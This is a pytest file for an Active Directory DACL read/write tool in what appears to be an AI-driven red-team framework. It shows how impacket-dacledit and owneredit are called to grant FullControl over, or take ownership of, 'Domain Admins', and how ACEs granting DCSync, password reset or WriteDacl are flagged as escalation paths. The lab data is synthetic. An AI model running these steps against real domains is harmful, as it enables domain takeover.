"""``nexus.attack.ad_acl``: read/modify AD DACLs (DeadDrop phase 5).

Measured origin: the campaign reached ``synthetic-user`` as Pwn3d on the DC and then
stopped, because OMNI had no primitive to read an object's DACL or to write one.
These tests pin the two things that decide whether the tool is usable in a run:
the argv actually handed to ``impacket-dacledit`` (auth, target, action, rights)
and the parser's answer to "which ACEs grant a next step" - including the
negatives, because an LDAP refusal reported as "no permissions" would end the
run one step early.
"""

from __future__ import annotations

import asyncio
import json

import pytest

from nexus_core.kernel.models import Identity, RunContext
from nexus_core.kernel.sandbox import SandboxResult
from nexus_core.tools.handlers import ad_acl as module
from nexus_core.tools.handlers.ad_acl import (
    AD_ACL_RIGHTS,
    ad_acl_definition,
    ad_acl_handler,
)

#: Verbatim shape of ``impacket-dacledit -action read`` (v0.13): the ACE index
#: line, then one labelled row per parsed attribute.
DACLEDIT_READ = """Impacket v0.13.1 - Copyright Fortra, LLC

[*] Parsing DACL
[*] Printing parsed DACL
[*]   ACE[0] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     ACE flags                 : None
[*]     Access mask               : FullControl, READ_CONTROL, WRITE_DAC, WRITE_OWNER (0xf01ff)
[*]     Trustee (SID)             : DEADDROP\\Domain Admins (S-1-5-21-1-2-3-512)
[*]   ACE[1] info
[*]     ACE Type                  : ACCESS_ALLOWED_OBJECT_ACE
[*]     ACE flags                 : None
[*]     Access mask               : ControlAccess (0x100)
[*]     Object type (GUID)        : User-Force-Change-Password (00299570-246d-11d0-a768-00aa006e0529)
[*]     Trustee (SID)             : DEADDROP\\synthetic-user (S-1-5-21-1-2-3-1104)
[*]   ACE[2] info
[*]     ACE Type                  : ACCESS_ALLOWED_ACE
[*]     Access mask               : Read (0x20094)
[*]     Trustee (SID)             : DEADDROP\\helpdesk (S-1-5-21-1-2-3-1177)
[*] Owner: DEADDROP\\Domain Admins
"""

#: The older layout, where the label follows the index instead of the info line.
DACLEDIT_READ_LEGACY = """[*] ACE[0] trustee: - DEADDROP\\svc-sql (S-1-5-21-1-2-3-1188)
[*] ACE[0] rights: - WriteDacl
[*] ACE[1] trustee: - DEADDROP\\Domain Users (S-1-5-21-1-2-3-513)
[+] ACE[1] rights: - ReadProperty
"""


def _context() -> RunContext:
    return RunContext(
        "system",
        Identity("operator-1", "system", roles=("operator",)),
        project_root="/tmp/workspace",
    )


@pytest.fixture()
def sandbox(monkeypatch):
    """Capture the argv and replay a canned stdout for the handler."""
    state: dict[str, object] = {"payload": "", "exit_code": 0, "argv": []}

    def fake_ad_sandbox(*args, **kwargs):  # noqa: ARG001 - signature parity
        return object()

    async def fake_run(sandbox_obj, argv, **kwargs):  # noqa: ARG001
        state["argv"] = list(argv)
        return SandboxResult(int(state["exit_code"]), str(state["payload"]), "")

    monkeypatch.setattr(module, "ad_sandbox", fake_ad_sandbox)
    monkeypatch.setattr(module, "run_in_sandbox", fake_run)
    monkeypatch.setattr(module, "resolve_impacket_binary", lambda name: f"/usr/bin/impacket-{name}")

    def reply(payload: str, exit_code: int = 0) -> None:
        state["payload"] = payload
        state["exit_code"] = exit_code

    state["reply"] = reply
    return state


def _read(**overrides):
    arguments = {
        "action": "read",
        "target": "10.0.0.1",
        "target_object": "Domain Admins",
        "domain": "deaddrop.loc",
        "username": "synthetic-user",
        "password": "synthetic-password",
        "principal": "synthetic-user",
    }
    arguments.update(overrides)
    return asyncio.run(ad_acl_handler(arguments, _context()))


# ------------------------------------------------------------------ definition
def test_definition_declares_the_directory_write_risk():
    definition = ad_acl_definition()
    assert definition.tool_id == "nexus.attack.ad_acl"
    assert definition.scope_target_field == "target" and definition.scope_required
    assert definition.risk.value == "high"
    properties = definition.input_schema["properties"]
    assert set(properties["rights"]["enum"]) == set(AD_ACL_RIGHTS)
    assert set(definition.input_schema["required"]) == {"action", "target", "domain", "username"}


# -------------------------------------------------------------------- read argv
def test_read_asks_dacledit_for_the_target_and_prints_aces(sandbox):
    sandbox["reply"](DACLEDIT_READ)
    result = _read()
    argv = sandbox["argv"]
    assert argv[0] == "/usr/bin/impacket-dacledit"
    assert argv[-1] == "deaddrop.loc/synthetic-user:synthetic-password"
    assert argv[argv.index("-target") + 1] == "Domain Admins"
    assert argv[argv.index("-principal") + 1] == "synthetic-user"
    assert argv[argv.index("-action") + 1] == "read"
    assert argv[argv.index("-dc-ip") + 1] == "10.0.0.1"
    assert "-rights" not in argv
    assert result.verified and result.verification_method == "ad_acl_read"


def test_read_uses_the_hash_and_the_dn_when_asked(sandbox):
    sandbox["reply"](DACLEDIT_READ)
    _read(
        password=None,
        hash="a" * 32,
        target_object=None,
        target_dn="CN=Domain Admins,CN=Users,DC=deaddrop,DC=loc",
    )
    argv = sandbox["argv"]
    assert argv[argv.index("-hashes") + 1] == "a" * 32
    assert argv[argv.index("-target-dn") + 1].startswith("CN=Domain Admins")
    assert "-target" not in argv
    # No secret in the positional: hash auth keeps the identity bare.
    assert argv[-1] == "deaddrop.loc/synthetic-user"


# ----------------------------------------------------------------- parse answer
def test_read_returns_only_the_aces_that_grant_a_next_step(sandbox):
    sandbox["reply"](DACLEDIT_READ)
    result = _read()
    abusable = result.output["abusable"]
    # FullControl also carries WRITE_DAC/WRITE_OWNER bits, and the object ACE
    # carries its right in the GUID - both are escalation paths and both show up.
    assert abusable[0]["rights"] == ["FullControl", "WriteDacl", "WriteOwner"]
    assert abusable[1]["rights"] == ["AllExtendedRights", "ResetPassword"]
    assert [ace["index"] for ace in abusable] == [0, 1]
    assert abusable[1]["sid"] == "S-1-5-21-1-2-3-1104"
    # ACE[2] is a plain Read: visible in ``all_aces`` but never offered as a step.
    assert [ace["index"] for ace in result.output["all_aces"]] == [0, 1, 2]
    assert result.output["all_aces"][2]["rights"] == []
    assert result.output["all_aces"][2]["access"] == "Read (0x20094)"
    # The ACE the caller holds is the escalation path, and it is flagged as such.
    assert [ace["trustee"] for ace in result.output["principal_holds"]] == [
        "DEADDROP\\synthetic-user (S-1-5-21-1-2-3-1104)"
    ]
    assert result.output["ace_count"] == 3
    assert result.evidence["abusable_count"] == 2
    assert result.evidence["principal_holds"] == [1]


def test_the_owner_header_is_not_counted_as_an_ace_right(sandbox):
    sandbox["reply"](DACLEDIT_READ)
    result = _read()
    assert all(ace["index"] != 3 for ace in result.output["all_aces"])


def test_read_understands_the_older_ace_layout(sandbox):
    sandbox["reply"](DACLEDIT_READ_LEGACY)
    result = _read(principal="svc-sql")
    abusable = result.output["abusable"]
    assert [(ace["index"], ace["rights"]) for ace in abusable] == [(0, ["WriteDacl"])]
    assert result.output["principal_holds"][0]["rights"] == ["WriteDacl"]


def test_dcsync_and_group_membership_guids_are_recognised(sandbox):
    sandbox["reply"](
        "[*]   ACE[0] info\n"
        "[*]     Access mask               : ControlAccess (0x100)\n"
        "[*]     Object type (GUID)        : DS-Replication-Get-Changes-All (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)\n"
        "[*]     Trustee (SID)             : DEADDROP\\synthetic-user (S-1-5-21-1-2-3-1104)\n"
        "[*]   ACE[1] info\n"
        "[*]     Access mask               : ControlAccess (0x100)\n"
        "[*]     Object type (GUID)        : Self-Membership (bf9679c0-0de6-11d0-a285-00aa003049e2)\n"
        "[*]     Trustee (SID)             : DEADDROP\\synthetic-user (S-1-5-21-1-2-3-1104)\n"
    )
    rights = [ace["rights"] for ace in _read().output["abusable"]]
    assert rights == [
        ["AllExtendedRights", "DCSync"],
        ["AllExtendedRights", "AddMember"],
    ]


def test_read_without_aces_or_ldap_error_is_a_declared_negative(sandbox):
    sandbox["reply"]("[-] Could not find object 'Domain Adminz' in the domain\n")
    result = _read(target_object="Domain Adminz")
    assert result.verified is False
    assert result.verification_method == "ad_acl_read_failed"


def test_read_refused_by_ldap_is_access_denied_not_an_empty_dacl(sandbox):
    sandbox["reply"]("[-] error: LDAPSessionError: invalidCredentials: 80090308\n")
    result = _read()
    assert result.verified is False
    assert result.verification_method == "ad_acl_access_denied"


def test_read_timeout_is_not_verified(sandbox, monkeypatch):
    async def timed_out(sandbox_obj, argv, **kwargs):  # noqa: ARG001
        return SandboxResult(124, "", "", timed_out=True)

    monkeypatch.setattr(module, "run_in_sandbox", timed_out)
    result = _read()
    assert result.verified is False
    assert result.timed_out is True
    assert result.verification_method == "ad_acl_timeout"


# ------------------------------------------------------------------- write side
def test_write_grants_the_rights_and_requires_the_impacket_marker(sandbox):
    sandbox["reply"]("[*] DACL modified successfully!\n")
    result = asyncio.run(ad_acl_handler({
        "action": "write", "target": "10.0.0.1",
        "target_object": "Domain Admins", "domain": "deaddrop.loc",
        "username": "synthetic-user", "password": "synthetic-password",
        "principal": "synthetic-user", "rights": "fullcontrol",
    }, _context()))
    argv = sandbox["argv"]
    assert argv[argv.index("-action") + 1] == "write"
    assert argv[argv.index("-rights") + 1] == "FullControl"
    assert argv[-1] == "deaddrop.loc/synthetic-user:synthetic-password"
    assert result.verified and result.verification_method == "ad_acl_write"
    assert result.output["modified"] is True


def test_a_write_without_the_marker_stays_refused(sandbox):
    sandbox["reply"]("[-] Could not modify DACL: rpc_s_access_denied\n", 1)
    result = asyncio.run(ad_acl_handler({
        "action": "write", "target": "10.0.0.1",
        "target_object": "Domain Admins", "domain": "deaddrop.loc",
        "username": "synthetic-user", "password": "x", "principal": "synthetic-user",
    }, _context()))
    assert result.verified is False
    assert result.verification_method == "ad_acl_write_refused"
    assert "rpc_s_access_denied" in result.output["detail"]


def test_take_ownership_uses_owneredit_with_the_new_owner(sandbox):
    sandbox["reply"]("[*] Owner modified successfully\n")
    result = asyncio.run(ad_acl_handler({
        "action": "take_ownership", "target": "10.0.0.1",
        "target_object": "Domain Admins", "domain": "deaddrop.loc",
        "username": "synthetic-user", "password": "synthetic-password",
        "principal": "synthetic-user",
    }, _context()))
    argv = sandbox["argv"]
    assert argv[0] == "/usr/bin/impacket-owneredit"
    assert argv[argv.index("-new-owner") + 1] == "synthetic-user"
    assert "-rights" not in argv
    assert result.verified and result.verification_method == "ad_acl_take_ownership"
    assert result.output["rights"] == "Owner"


# ------------------------------------------------------------------- the gaps
def test_a_missing_impacket_binary_is_declared(monkeypatch):
    monkeypatch.setattr(module, "resolve_impacket_binary", lambda name: None)
    result = _read()
    assert result.verified is False
    assert result.verification_method == "ad_acl_unavailable"
    assert "dacledit" in result.output["error"]


@pytest.mark.parametrize(
    ("overrides", "message"),
    [
        ({"action": "write", "principal": ""}, "requires principal"),
        ({"password": "x", "hash": "a" * 32}, "not both"),
        ({"password": None, "hash": "zz"}, "32 hex"),
        ({"action": "write", "rights": "God"}, "unsupported rights"),
        ({"target_object": None, "target_dn": None}, "target_object or target_dn"),
        ({"action": "delete"}, "unsupported action"),
    ],
)
def test_bad_arguments_are_refused_before_spawning_anything(sandbox, overrides, message):
    sandbox["reply"](DACLEDIT_READ)
    with pytest.raises(ValueError, match=message):
        _read(**overrides)
    assert sandbox["argv"] == []


def test_the_tool_is_registered_in_the_catalog():
    from nexus_core.tools.registry import durable_tool_definitions

    definitions = durable_tool_definitions("system")
    definition, handler = definitions["nexus.attack.ad_acl"]
    assert definition.effect == "post_exploitation"
    assert callable(handler)
    # The registry wraps every handler in its execution contract, so compare the
    # underlying callable rather than the wrapper.
    underlying = getattr(handler, "__wrapped__", handler)
    assert underlying is ad_acl_handler or underlying.__name__ == "ad_acl_handler"
    # The catalog entry must serialize: the model receives it as JSON.
    json.dumps(definition.input_schema)
